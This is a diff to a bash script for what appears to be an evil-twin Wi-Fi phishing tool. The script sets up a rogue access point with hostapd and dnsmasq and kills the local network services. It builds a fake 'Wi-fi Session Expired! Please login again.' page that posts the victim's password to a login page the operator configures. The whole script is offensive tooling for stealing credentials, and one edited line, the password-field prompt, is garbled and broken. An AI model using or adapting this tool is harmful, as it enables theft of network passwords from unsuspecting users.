@@ -1,3 +1,5 @@
+#!/bin/bash
+
 trap 'printf "\n"; stop; exit 1' 2
 
 list_folders() {
@@ -5,6 +7,15 @@ list_folders() {
   counter=1
   for folder in $(ls -d */) ; do
     printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter $folder
+    let counter++
+  done
+}
+
+list_files() {
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Available files:\e[0m\n"
+  counter=1
+  for file in $(ls -p | grep -v /) ; do
+    printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter $file
     let counter++
   done
 }
@@ -58,47 +69,38 @@ getcredentials() {
 }
 
 createpage() {
-default_cap1="Wi-fi Session for '$use_ssid' Expired!"
-default_cap2="Please login again."
-#default_user_text="Username:"
-default_pass_text="Password"
-default_sub_text="Log-In"
+  default_cap1="Wi-fi Session for '$use_ssid' Expired!"
+  default_cap2="Please login again."
+  default_pass_text="Password"
+  default_sub_text="Log-In"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session for SSID Expired!): \e[0m' cap1
-cap1="${cap1:-${default_cap1}}"
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session for SSID Expired!): \e[0m' cap1
+  cap1="${cap1:-${default_cap1}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
-cap2="${cap2:-${default_cap2}}"
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
+  cap2="${cap2:-${default_cap2}}"
 
-#read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
-#user_text="${user_text:-${default_user_text}}"
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m'pass_text="${pass_text:-${default_pass_text}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
-pass_text="${pass_text:-${default_pass_text}}"
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
+  sub_text="${sub_text:-${default_sub_text}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
-sub_text="${sub_text:-${default_sub_text}}"
-
-echo "<!DOCTYPE html>" > index.html
-echo "<html>" >> index.html
-echo "<body bgcolor=\"gray\" text=\"white\">" >> index.html
-IFS=$'\n'
-printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> index.html
-IFS=$'\n'
-printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> index.html
-IFS=$'\n'
-#printf '<input type="text" name="username" length=64>\n' >> index.html
-#IFS=$'\n'
-printf '<br><label>%s: </label>' $pass_text >> index.html
-IFS=$'\n'
-printf '<input type="password" name="password" length=64><br><br>\n' >> index.html
-IFS=$'\n'
-printf '<input value="%s" type="submit"></form>\n' $sub_text >> index.html
-printf '</center>' >> index.html
-printf '<body>\n' >> index.html
-printf '</html>\n' >> index.html
-
-
+  echo "<!DOCTYPE html>" > index.html
+  echo "<html>" >> index.html
+  echo "<body bgcolor=\"gray\" text=\"white\">" >> index.html
+  IFS=$'\n'
+  printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> index.html
+  IFS=$'\n'
+  printf '<form method="POST" action="%s"><label>%s </label>\n' $login_page $user_text >> index.html
+  IFS=$'\n'
+  printf '<br><label>%s: </label>' $pass_text >> index.html
+  IFS=$'\n'
+  printf '<input type="password" name="password" length=64><br><br>\n' >> index.html
+  IFS=$'\n'
+  printf '<input value="%s" type="submit"></form>\n' $sub_text >> index.html
+  printf '</center>' >> index.html
+  printf '<body>\n' >> index.html
+  printf '</html>\n' >> index.html
 }
 
 server() {
@@ -109,7 +111,7 @@ server() {
 }
 
 stop() {
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Killing all conections..\n" 
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Killing all connections..\n" 
   killall dnsmasq hostapd > /dev/null 2>&1
   sleep 4
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Restarting Network Service..\n" 
@@ -135,8 +137,10 @@ start() {
   IFS=$'\n'
   read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] SSID to use:\e[0m ' use_ssid
   read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Channel to use:\e[0m ' use_channel
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Login page (Default: login.php): \e[0m' login_page
+  login_page="${login_page:-login.php}"
   createpage
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Killing all conections..\e[0m\n" 
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Killing all connections..\e[0m\n" 
   sleep 2
   killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
   sleep 5
@@ -182,6 +186,6 @@ case "$1" in --stop) stop ;;
 *) 
 banner 
 dependencies 
-start
- ;;
- esac
+start 
+;; 
+esac
